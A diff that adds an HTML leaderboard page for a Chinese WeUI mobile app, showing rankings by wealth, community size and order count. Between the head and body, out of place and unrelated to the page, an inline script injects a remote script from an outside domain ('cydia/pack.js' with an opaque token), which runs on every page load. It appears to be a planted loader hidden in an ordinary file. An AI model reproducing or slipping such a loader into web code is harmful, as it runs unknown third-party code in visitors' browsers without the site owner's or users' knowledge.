@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+		<title>排行榜</title>
+		<link rel="stylesheet" href="../../static/css/weui.css" />
+		<link rel="stylesheet" href="../../static/css/common.css" />
+		<link rel="stylesheet" href="../../static/css/home/ranking.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<header class="weui-bar weui-bar-nav voteActivty" id="returnBtn">
+		    <a class="weui-pull-left weui-btns">
+		        <span class="weui-cell__fts"></span>
+		    </a>
+		    <div class="weui-title">排行榜</div>
+		</header>
+		<div class="rankBox threeBox">
+			<div class="weui-tab">
+				<div class="weui-navbar threeRank">
+					<a class="weui-navbar__item weui-bar__item--on" data-id="0" href="#tab1">
+			      		<span>财富总量</span>
+			    	</a>
+			    	<a class="weui-navbar__item" data-id="1" href="#tab1">
+			    	  	<span>社群人数</span>
+			    	</a>
+			    	<a class="weui-navbar__item" data-id="2" href="#tab1">
+			    	  	<span>交易单量</span>
+			    	</a>
+				</div>
+				<div class="weui-tab__bd">
+			    	<div id="tab1" class="weui-tab__bd-item weui-tab__bd-item--active">
+			      		<p class="rankNum">我的排名：<span></span></p>
+			      		<div class="ranking">
+							<ul id="threeList">
+							</ul>
+						</div>
+						<div class="rankList">
+							<ul id="lastList">
+							</ul>
+						</div>
+			    	</div>
+			  	</div>
+			</div>
+		</div>
+		<script type="text/javascript" src="../../lib/zepto.min.js" ></script>
+		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="../../lib/weui.js" ></script>
+		<script type="text/javascript" src="../../static/js/common.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js" ></script>
+		<script type="text/javascript" src="../../static/js/home/ranking.js" ></script>
+	</body>
+</html>
